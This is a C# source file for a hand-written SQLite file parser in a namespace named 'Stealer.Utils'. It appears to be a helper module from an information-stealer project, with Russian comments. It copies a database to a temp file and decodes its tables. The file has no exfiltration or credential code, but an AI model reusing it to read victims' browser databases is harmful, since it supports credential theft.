using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace Stealer.Utils
{
    public class SQLiteParser
    {
        private readonly ulong _dbEncoding;
        private readonly byte[] _fileBytes;
        private readonly ulong _pageSize;
        private readonly byte[] _sqlDataTypeSize = new byte[] { 0, 1, 2, 3, 4, 6, 8, 8, 0, 0 };
        private string[] _fieldNames;
        private SqliteMasterEntry[] _masterTableEntries;
        private TableEntry[] _tableEntries;

        public SQLiteParser(string fileName)
        {
            _fileBytes = File.ReadAllBytes(fileName);
            _pageSize = ConvertToULong(16, 2);
            _dbEncoding = ConvertToULong(56, 4);
            ReadMasterTable(100L);
        }

        public SQLiteParser(byte[] basedata)
        {
            _fileBytes = basedata;
            _pageSize = ConvertToULong(16, 2);
            _dbEncoding = ConvertToULong(56, 4);
            ReadMasterTable(100L);
        }

        public string GetValue(int rowNum, int field)
        {
            try
            {
                if (rowNum >= _tableEntries.Length)
                    return null;
                    
                return (field >= _tableEntries[rowNum].Content.Length) ? null : _tableEntries[rowNum].Content[field];
            }
            catch
            {
                return "";
            }
        }

        public int GetRowCount()
        {
            return _tableEntries.Length;
        }

        public int GetFieldIndex(string fieldName)
        {
            if (_fieldNames == null) return -1;
            for (int i = 0; i < _fieldNames.Length; i++)
            {
                if (_fieldNames[i] != null &&
                    string.Compare(_fieldNames[i], fieldName, StringComparison.OrdinalIgnoreCase) == 0)
                    return i;
            }
            return -1;
        }

        public string GetFieldNames()
        {
            if (_fieldNames == null) return "(null)";
            return string.Join(", ", _fieldNames.Select((n, i) => $"[{i}]={n ?? "null"}"));
        }

        public bool ReadTable(string tableName)
        {
            int num = -1;
            for (int i = 0; i < _masterTableEntries.Length; i++)
            {
                if (_masterTableEntries[i].ItemName != null &&
                    string.Compare(_masterTableEntries[i].ItemName.ToLower(), tableName.ToLower(), StringComparison.Ordinal) == 0)
                {
                    num = i;
                    break;
                }
            }
            
            if (num == -1)
                return false;
                
            string createSql = _masterTableEntries[num].SqlStatement;
            string columnsPart = createSql.Substring(createSql.IndexOf("(", StringComparison.Ordinal) + 1);

            // Split by comma but respect parentheses (for constraints like CHECK(...))
            var columnDefs = new System.Collections.Generic.List<string>();
            int parenDepth = 0;
            int segStart = 0;
            for (int ci = 0; ci < columnsPart.Length; ci++)
            {
                if (columnsPart[ci] == '(') parenDepth++;
                else if (columnsPart[ci] == ')') parenDepth--;
                else if (columnsPart[ci] == ',' && parenDepth == 0)
                {
                    columnDefs.Add(columnsPart.Substring(segStart, ci - segStart));
                    segStart = ci + 1;
                }
            }
            if (segStart < columnsPart.Length)
                columnDefs.Add(columnsPart.Substring(segStart));

            var fieldList = new System.Collections.Generic.List<string>();
            foreach (string colDef in columnDefs)
            {
                string trimmed = colDef.Trim();
                string upper = trimmed.ToUpperInvariant();

                // Skip table-level constraints (not column definitions)
                if (upper.StartsWith("UNIQUE") || upper.StartsWith("PRIMARY") ||
                    upper.StartsWith("CHECK") || upper.StartsWith("FOREIGN") ||
                    upper.StartsWith("CONSTRAINT"))
                    continue;

                int spaceIdx = trimmed.IndexOf(' ');
                string colName = spaceIdx > 0 ? trimmed.Substring(0, spaceIdx) : trimmed;
                colName = colName.Trim('"', '\'', '`', '[', ']', '\n', '\r', '\t');

                if (string.IsNullOrEmpty(colName))
                    continue;

                fieldList.Add(colName);
            }

            _fieldNames = fieldList.ToArray();
            
            // Очищаем список посещенных страниц перед началом парсинга
            _visitedPages.Clear();
            
            return ReadTableFromOffset((ulong)((_masterTableEntries[num].RootNum - 1L) * (long)_pageSize));
        }

        public static SQLiteParser ReadTable(string database, string table)
        {
            string tempFile = null;
            try
            {
                tempFile = Path.GetTempFileName() + ".tmpdb";
                File.Copy(database, tempFile, true);
                
                SQLiteParser parser = new SQLiteParser(tempFile);
                
                bool success = parser.ReadTable(table);
                
                try { File.Delete(tempFile); } catch { }
                
                if (!success)
                    return null;
                
                int rowCount = parser.GetRowCount();
                
                // Если слишком много строк (возможно ошибка парсинга), возвращаем null
                if (rowCount > 100000)
                    return null;
                    
                return parser;
            }
            catch
            {
                if (tempFile != null)
                {
                    try { File.Delete(tempFile); } catch { }
                }
                return null;
            }
        }

        private HashSet<ulong> _visitedPages = new HashSet<ulong>();
        
        private bool ReadTableFromOffset(ulong offset)
        {
            return ReadTableFromOffset(offset, 0);
        }
        
        private bool ReadTableFromOffset(ulong offset, int depth)
        {
            try
            {
                // Защита от слишком глубокой рекурсии
                if (depth > 100)
                    return false;
                
                if (offset >= (ulong)_fileBytes.Length)
                    return false;
                
                // Защита от циклических ссылок
                if (_visitedPages.Contains(offset))
                    return false;
                    
                _visitedPages.Add(offset);
                
                byte b = _fileBytes[(int)offset];
                
                if (b == 5)
                {
                    uint num19 = (uint)(ConvertToULong((int)(offset + 3UL), 2) - 1UL);
                    
                    if (num19 > 10000) // Защита от слишком большого количества записей
                        return false;
                    
                    for (uint num20 = 0U; num20 <= num19; num20++)
                    {
                        uint num21 = (uint)ConvertToULong((int)offset + 12 + (int)(num20 * 2U), 2);
                        ulong newOffset = (ConvertToULong((int)(offset + (ulong)num21), 4) - 1UL) * _pageSize;
                        
                        if (newOffset >= (ulong)_fileBytes.Length)
                            continue;
                        
                        if (newOffset == offset) // Защита от самоссылки
                            continue;
                            
                        ReadTableFromOffset(newOffset, depth + 1);
                    }
                    
                    ulong nextOffset = (ConvertToULong((int)(offset + 8UL), 4) - 1UL) * _pageSize;
                    
                    if (nextOffset < (ulong)_fileBytes.Length && nextOffset != offset)
                        ReadTableFromOffset(nextOffset, depth + 1);
                }
                else if (b == 13)
                {
                    uint num = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
                    
                    if (num > 10000) // Защита от слишком большого количества записей
                        return false;
                    
                    int num2 = 0;
                    
                    if (_tableEntries != null)
                    {
                        num2 = _tableEntries.Length;
                        
                        if (num2 + (int)num + 1 > 100000) // Защита от слишком большого массива
                            return false;
                            
                        Array.Resize(ref _tableEntries, _tableEntries.Length + (int)num + 1);
                    }
                    else
                    {
                        _tableEntries = new TableEntry[num + 1U];
                    }
                    
                    for (uint num3 = 0U; num3 <= num; num3++)
                    {
                        ulong num4 = ConvertToULong((int)offset + 8 + (int)(num3 * 2U), 2);
                        
                        if (offset != 100UL)
                            num4 += offset;
                        
                        if (num4 >= (ulong)_fileBytes.Length)
                            continue;
                            
                        int num5 = Gvl((int)num4);
                        if (num5 == 0 || num5 >= _fileBytes.Length)
                            continue;
                            
                        Cvl((int)num4, num5);
                        int num6 = Gvl((int)(num4 + (ulong)(num5 - (int)num4) + 1UL));
                        if (num6 == 0 || num6 >= _fileBytes.Length)
                            continue;
                            
                        Cvl((int)(num4 + (ulong)(num5 - (int)num4) + 1UL), num6);
                        ulong num7 = num4 + (ulong)(num6 - (int)num4 + 1);
                        
                        if (num7 >= (ulong)_fileBytes.Length)
                            continue;
                            
                        int num8 = Gvl((int)num7);
                        if (num8 == 0 || num8 >= _fileBytes.Length)
                            continue;
                            
                        int num9 = num8;
                        long num10 = Cvl((int)num7, num8);
                        
                        if (num10 < 0 || num10 > 10000) // Защита от слишком большого заголовка
                            continue;
                        
                        RecordHeaderField[] array = null;
                        long num11 = (long)(num7 - (ulong)num8 + 1UL);
                        int num12 = 0;
                        
                        while (num11 < num10 && num12 < 1000) // Ограничение на количество полей
                        {
                            Array.Resize(ref array, num12 + 1);
                            int num13 = num9 + 1;
                            
                            if (num13 >= _fileBytes.Length)
                                break;
                                
                            num9 = Gvl(num13);
                            if (num9 == 0 || num9 >= _fileBytes.Length)
                                break;
                                
                            array[num12].Type = Cvl(num13, num9);
                            array[num12].Size = (long)((array[num12].Type <= 9L) ? ((ulong)_sqlDataTypeSize[array[num12].Type]) : ((ulong)((!IsOdd(array[num12].Type)) ? ((array[num12].Type - 12L) / 2L) : ((array[num12].Type - 13L) / 2L))));
                            
                            if (array[num12].Size < 0 || array[num12].Size > 1000000) // Защита от слишком большого размера
                                break;
                                
                            num11 = num11 + (long)(num9 - num13) + 1L;
                            num12++;
                        }
                        
                        if (array != null && array.Length > 0)
                        {
                            _tableEntries[num2 + (int)num3].Content = new string[array.Length];
                            int num14 = 0;
                            
                            for (int i = 0; i <= array.Length - 1; i++)
                            {
                                if (array[i].Type > 9L)
                                {
                                    if (!IsOdd(array[i].Type))
                                    {
                                        // BLOB data - return as string via Encoding.Default (like InteliX)
                                        int startIndex = (int)(num7 + (ulong)num10 + (ulong)num14);
                                        int size = (int)array[i].Size;
                                        
                                        if (startIndex < 0 || size < 0 || startIndex + size > _fileBytes.Length)
                                        {
                                            _tableEntries[num2 + (int)num3].Content[i] = "";
                                            num14 += (int)array[i].Size;
                                            continue;
                                        }
                                        
                                        _tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, startIndex, size);
                                    }
                                    else
                                    {
                                        // String data
                                        int startIndex = (int)(num7 + (ulong)num10 + (ulong)num14);
                                        int size = (int)array[i].Size;
                                        
                                        if (startIndex < 0 || size < 0 || startIndex + size > _fileBytes.Length)
                                        {
                                            _tableEntries[num2 + (int)num3].Content[i] = "";
                                            num14 += (int)array[i].Size;
                                            continue;
                                        }
                                        
                                        long dbEncoding = (long)_dbEncoding;
                                        long num15 = dbEncoding - 1L;
                                        
                                        if (num15 <= 2L)
                                        {
                                            switch ((uint)num15)
                                            {
                                                case 0U:
                                                    _tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, startIndex, size);
                                                    break;
                                                case 1U:
                                                    _tableEntries[num2 + (int)num3].Content[i] = Encoding.Unicode.GetString(_fileBytes, startIndex, size);
                                                    break;
                                                case 2U:
                                                    _tableEntries[num2 + (int)num3].Content[i] = Encoding.BigEndianUnicode.GetString(_fileBytes, startIndex, size);
                                                    break;
                                            }
                                        }
                                        else
                                        {
                                            _tableEntries[num2 + (int)num3].Content[i] = Encoding.Default.GetString(_fileBytes, startIndex, size);
                                        }
                                    }
                                }
                                else
                                {
                                    int startIndex = (int)(num7 + (ulong)num10 + (ulong)num14);
                                    int size = (int)array[i].Size;
                                    
                                    if (startIndex < 0 || size < 0 || startIndex + size > _fileBytes.Length)
                                    {
                                        _tableEntries[num2 + (int)num3].Content[i] = "0";
                                        num14 += (int)array[i].Size;
                                        continue;
                                    }
                                    
                                    _tableEntries[num2 + (int)num3].Content[i] = Convert.ToString(ConvertToULong(startIndex, size));
                                }
                                num14 += (int)array[i].Size;
                            }
                        }
                    }
                }
                
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void ReadMasterTable(long offset)
        {
            byte b = 0;
            int maxIterations = 1000; // Защита от бесконечного цикла
            int iterations = 0;
            
            while (iterations < maxIterations)
            {
                iterations++;
                
                if (offset < 0 || offset >= _fileBytes.Length)
                    return;
                
                b = _fileBytes[(int)offset];
                
                if (b != 5)
                    break;
                    
                uint num = (uint)(ConvertToULong((int)offset + 3, 2) - 1UL);
                
                if (num > 10000) // Защита от слишком большого количества записей
                    return;
                
                for (int i = 0; i <= (int)num; i++)
                {
                    uint num2 = (uint)ConvertToULong((int)offset + 12 + i * 2, 2);
                    
                    if (offset == 100L)
                        ReadMasterTable((long)((ConvertToULong((int)num2, 4) - 1UL) * _pageSize));
                    else
                        ReadMasterTable((long)((ConvertToULong((int)(offset + (long)num2), 4) - 1UL) * _pageSize));
                }
                
                long newOffset = (long)((ConvertToULong((int)offset + 8, 4) - 1UL) * _pageSize);
                
                if (newOffset == offset || newOffset < 0 || newOffset >= _fileBytes.Length)
                    return;
                    
                offset = newOffset;
            }
            
            if (iterations >= maxIterations)
                return;
            
            if (b == 13)
            {
                ulong num3 = ConvertToULong((int)offset + 3, 2) - 1UL;
                
                if (num3 > 10000) // Защита от слишком большого количества записей
                    return;
                
                int num4 = 0;
                
                if (_masterTableEntries != null)
                {
                    num4 = _masterTableEntries.Length;
                    Array.Resize(ref _masterTableEntries, _masterTableEntries.Length + (int)num3 + 1);
                }
                else
                {
                    _masterTableEntries = new SqliteMasterEntry[num3 + 1UL];
                }
                
                for (ulong num5 = 0UL; num5 <= num3; num5++)
                {
                    ulong num6 = ConvertToULong((int)offset + 8 + (int)num5 * 2, 2);
                    
                    if (offset != 100L)
                        num6 += (ulong)offset;
                        
                    int num7 = Gvl((int)num6);
                    Cvl((int)num6, num7);
                    int num8 = Gvl((int)(num6 + (ulong)(num7 - (int)num6) + 1UL));
                    Cvl((int)(num6 + (ulong)(num7 - (int)num6) + 1UL), num8);
                    ulong num9 = num6 + (ulong)(num8 - (int)num6 + 1);
                    int num10 = Gvl((int)num9);
                    int num11 = num10;
                    long num12 = Cvl((int)num9, num10);
                    
                    long[] array = new long[5];
                    for (int j = 0; j <= 4; j++)
                    {
                        int startIdx = num11 + 1;
                        num11 = Gvl(startIdx);
                        array[j] = Cvl(startIdx, num11);
                        array[j] = (long)((array[j] <= 9L) ? ((ulong)_sqlDataTypeSize[array[j]]) : ((ulong)((!IsOdd(array[j])) ? ((array[j] - 12L) / 2L) : ((array[j] - 13L) / 2L))));
                    }
                    
                    if (_dbEncoding == 1UL || _dbEncoding == 2UL)
                    {
                        long dbEncoding = (long)_dbEncoding;
                        long num13 = dbEncoding - 1L;
                        
                        if (num13 <= 2L)
                        {
                            switch ((uint)num13)
                            {
                                case 0U:
                                    _masterTableEntries[num4 + (int)num5].ItemName = Encoding.Default.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0]), (int)array[1]);
                                    break;
                                case 1U:
                                    _masterTableEntries[num4 + (int)num5].ItemName = Encoding.Unicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0]), (int)array[1]);
                                    break;
                                case 2U:
                                    _masterTableEntries[num4 + (int)num5].ItemName = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0]), (int)array[1]);
                                    break;
                            }
                        }
                    }
                    
                    _masterTableEntries[num4 + (int)num5].RootNum = (long)ConvertToULong((int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2]), (int)array[3]);
                    
                    long dbEncoding2 = (long)_dbEncoding;
                    long num17 = dbEncoding2 - 1L;
                    
                    if (num17 <= 2L)
                    {
                        switch ((uint)num17)
                        {
                            case 0U:
                                _masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.Default.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                                break;
                            case 1U:
                                _masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.Unicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                                break;
                            case 2U:
                                _masterTableEntries[num4 + (int)num5].SqlStatement = Encoding.BigEndianUnicode.GetString(_fileBytes, (int)(num9 + (ulong)num12 + (ulong)array[0] + (ulong)array[1] + (ulong)array[2] + (ulong)array[3]), (int)array[4]);
                                break;
                        }
                    }
                }
            }
        }

        private ulong ConvertToULong(int startIndex, int size)
        {
            try
            {
                if (size > 8 || size == 0)
                    return 0UL;
                    
                ulong num = 0UL;
                for (int i = 0; i <= size - 1; i++)
                {
                    num = (num << 8 | (ulong)_fileBytes[startIndex + i]);
                }
                return num;
            }
            catch
            {
                return 0UL;
            }
        }

        private int Gvl(int startIdx)
        {
            try
            {
                if (startIdx > _fileBytes.Length)
                    return 0;
                    
                for (int i = startIdx; i <= startIdx + 8; i++)
                {
                    if (i > _fileBytes.Length - 1)
                        return 0;
                        
                    if ((_fileBytes[i] & 128) != 128)
                        return i;
                }
                
                return startIdx + 8;
            }
            catch
            {
                return 0;
            }
        }

        private long Cvl(int startIdx, int endIdx)
        {
            try
            {
                endIdx++;
                byte[] array = new byte[8];
                int num = endIdx - startIdx;
                bool flag = false;
                
                if (num == 0 || num > 9)
                    return 0L;
                    
                if (num == 1)
                {
                    array[0] = (byte)(_fileBytes[startIdx] & 127);
                    return BitConverter.ToInt64(array, 0);
                }
                
                if (num == 9)
                    flag = true;
                    
                int num4 = 1;
                int num5 = 7;
                int num6 = 0;
                
                if (flag)
                {
                    array[0] = _fileBytes[endIdx - 1];
                    endIdx--;
                    num6 = 1;
                }
                
                for (int i = endIdx - 1; i >= startIdx; i--)
                {
                    if (i - 1 >= startIdx)
                    {
                        array[num6] = (byte)((_fileBytes[i] >> num4 - 1 & 255 >> num4) | (int)_fileBytes[i - 1] << num5);
                        num4++;
                        num6++;
                        num5--;
                    }
                    else
                    {
                        if (!flag)
                            array[num6] = (byte)(_fileBytes[i] >> num4 - 1 & 255 >> num4);
                    }
                }
                
                return BitConverter.ToInt64(array, 0);
            }
            catch
            {
                return 0L;
            }
        }

        private static bool IsOdd(long value)
        {
            return (value & 1L) == 1L;
        }

        private struct RecordHeaderField
        {
            public long Size;
            public long Type;
        }

        private struct TableEntry
        {
            public string[] Content;
        }

        private struct SqliteMasterEntry
        {
            public string ItemName;
            public long RootNum;
            public string SqlStatement;
        }
    }
}
